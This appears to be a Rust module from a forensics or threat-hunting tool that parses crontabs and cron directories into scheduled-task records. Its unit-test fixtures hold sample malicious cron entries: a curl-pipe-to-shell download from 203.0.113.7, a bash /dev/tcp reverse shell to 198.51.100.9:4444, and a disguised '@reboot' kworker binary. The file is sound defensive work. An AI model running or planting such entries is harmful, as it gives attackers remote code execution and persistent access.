#![forbid(unsafe_code)]

//! cron persistence: /etc/crontab, /etc/cron.d, per-user spool crontabs and
//! the run-parts directories (/etc/cron.{hourly,daily,weekly,monthly}).

use crate::util::split_fields;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CronEntry {
    /// Five-field expression or an `@keyword` (`@reboot`, `@daily`, ...).
    pub schedule: String,
    /// Present for system crontabs (/etc/crontab, /etc/cron.d/*).
    pub user: Option<String>,
    pub command: String,
    pub line_no: usize,
}

/// `NAME=value` environment assignment lines.
fn is_env_assignment(line: &str) -> bool {
    let Some((name, _)) = line.split_once('=') else {
        return false;
    };
    let name = name.trim();
    !name.is_empty()
        && !name.contains(char::is_whitespace)
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        && !name.chars().next().is_some_and(|c| c.is_ascii_digit())
}

/// Parses a crontab. `system_format` crontabs (/etc/crontab, /etc/cron.d)
/// carry a user column after the schedule; user crontabs do not.
pub fn parse_crontab(content: &str, system_format: bool) -> Vec<CronEntry> {
    let mut out = Vec::new();
    for (idx, raw) in content.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') || is_env_assignment(line) {
            continue;
        }
        let schedule_fields = if line.starts_with('@') { 1 } else { 5 };
        let n = schedule_fields + usize::from(system_format);
        let Some((fields, command)) = split_fields(line, n) else {
            continue;
        };
        if command.is_empty() {
            continue;
        }
        out.push(CronEntry {
            schedule: fields[..schedule_fields].join(" "),
            user: system_format.then(|| fields[schedule_fields].to_string()),
            command: command.to_string(),
            line_no: idx + 1,
        });
    }
    out
}

#[cfg(target_os = "linux")]
pub(crate) mod live {
    use super::*;
    use host_snapshot::ScheduledTaskObservation;
    use std::path::{Path, PathBuf};

    fn sorted_files(dir: &Path) -> Vec<PathBuf> {
        let mut files: Vec<PathBuf> = std::fs::read_dir(dir)
            .map(|entries| {
                entries
                    .flatten()
                    .filter(|e| {
                        !e.file_name().to_string_lossy().starts_with('.')
                            && e.metadata().map(|m| m.is_file()).unwrap_or(false)
                    })
                    .map(|e| e.path())
                    .collect()
            })
            .unwrap_or_default();
        files.sort();
        files
    }

    fn task(path: &Path, entry: &CronEntry, user: &str, now: &str) -> ScheduledTaskObservation {
        ScheduledTaskObservation {
            task_name: format!(
                "{}:{}",
                path.file_name()
                    .map(|n| n.to_string_lossy().into_owned())
                    .unwrap_or_default(),
                entry.line_no
            ),
            task_path: path.to_string_lossy().into_owned(),
            state: "Enabled".to_string(),
            action: Some(entry.command.clone()),
            arguments: None,
            run_level: user.to_string(),
            collected_at: now.to_string(),
            mechanism: "cron".to_string(),
            schedule: Some(entry.schedule.clone()),
            user: Some(user.to_string()),
        }
    }

    pub fn collect(
        root: &Path,
        now: &str,
        errors: &mut Vec<String>,
    ) -> Vec<ScheduledTaskObservation> {
        let mut out = Vec::new();

        let mut system_files = vec![root.join("etc/crontab")];
        system_files.extend(sorted_files(&root.join("etc/cron.d")));
        for path in system_files {
            let Ok(content) = std::fs::read_to_string(&path) else {
                continue;
            };
            for entry in parse_crontab(&content, true) {
                let user = entry.user.clone().unwrap_or_else(|| "root".to_string());
                out.push(task(&path, &entry, &user, now));
            }
        }

        // Debian: /var/spool/cron/crontabs/<user>; RHEL: /var/spool/cron/<user>.
        for spool in ["var/spool/cron/crontabs", "var/spool/cron"] {
            let dir = root.join(spool);
            if dir.is_dir() && std::fs::read_dir(&dir).is_err() {
                errors.push(format!(
                    "Нет доступа к /{} (пользовательские crontab не прочитаны)",
                    spool
                ));
                continue;
            }
            for path in sorted_files(&dir) {
                let user = path
                    .file_name()
                    .map(|n| n.to_string_lossy().into_owned())
                    .unwrap_or_default();
                let Ok(content) = std::fs::read_to_string(&path) else {
                    errors.push(format!("Нет доступа к crontab {}", path.display()));
                    continue;
                };
                for entry in parse_crontab(&content, false) {
                    out.push(task(&path, &entry, &user, now));
                }
            }
        }

        for period in ["hourly", "daily", "weekly", "monthly"] {
            for path in sorted_files(&root.join(format!("etc/cron.{}", period))) {
                let name = path
                    .file_name()
                    .map(|n| n.to_string_lossy().into_owned())
                    .unwrap_or_default();
                if name == "placeholder" || name.ends_with(".dpkg-old") {
                    continue;
                }
                out.push(ScheduledTaskObservation {
                    task_name: format!("cron.{}/{}", period, name),
                    task_path: path.to_string_lossy().into_owned(),
                    state: "Enabled".to_string(),
                    action: Some(path.to_string_lossy().into_owned()),
                    arguments: None,
                    run_level: "root".to_string(),
                    collected_at: now.to_string(),
                    mechanism: "cron_periodic".to_string(),
                    schedule: Some(format!("@{}", period)),
                    user: Some("root".to_string()),
                });
            }
        }
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const SYSTEM_CRONTAB: &str = "# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user\tcommand
17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly
25 6\t* * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
@reboot   www-data   /var/tmp/.cache/kworker -c /var/tmp/.cache/cfg
*/5 * * * * root curl -fsSL http://203.0.113.7/x.sh | sh
";

    const USER_CRONTAB: &str = "# DO NOT EDIT THIS FILE - edit the master and reinstall.
MAILTO=\"\"
0 3 * * 1 /home/alice/bin/backup.sh --full >/dev/null 2>&1
@hourly bash -c 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'
";

    #[test]
    fn parses_system_crontab_with_user_column() {
        let entries = parse_crontab(SYSTEM_CRONTAB, true);
        assert_eq!(entries.len(), 4);
        assert_eq!(entries[0].schedule, "17 * * * *");
        assert_eq!(entries[0].user.as_deref(), Some("root"));
        assert_eq!(
            entries[0].command,
            "cd / && run-parts --report /etc/cron.hourly"
        );
        assert_eq!(entries[0].line_no, 6);
        assert_eq!(entries[2].schedule, "@reboot");
        assert_eq!(entries[2].user.as_deref(), Some("www-data"));
        assert_eq!(
            entries[2].command,
            "/var/tmp/.cache/kworker -c /var/tmp/.cache/cfg"
        );
        assert_eq!(
            entries[3].command,
            "curl -fsSL http://203.0.113.7/x.sh | sh"
        );
    }

    #[test]
    fn parses_user_crontab_without_user_column() {
        let entries = parse_crontab(USER_CRONTAB, false);
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].schedule, "0 3 * * 1");
        assert_eq!(entries[0].user, None);
        assert_eq!(
            entries[0].command,
            "/home/alice/bin/backup.sh --full >/dev/null 2>&1"
        );
        assert_eq!(entries[1].schedule, "@hourly");
        assert_eq!(
            entries[1].command,
            "bash -c 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'"
        );
    }

    #[test]
    fn skips_env_lines_but_not_commands_with_equals() {
        assert!(is_env_assignment("PATH=/usr/bin"));
        assert!(is_env_assignment("MAILTO=\"\""));
        assert!(!is_env_assignment("0 3 * * * FOO=1 /bin/x"));
        let entries = parse_crontab("0 3 * * * FOO=1 /bin/x\n", false);
        assert_eq!(entries[0].command, "FOO=1 /bin/x");
    }
}
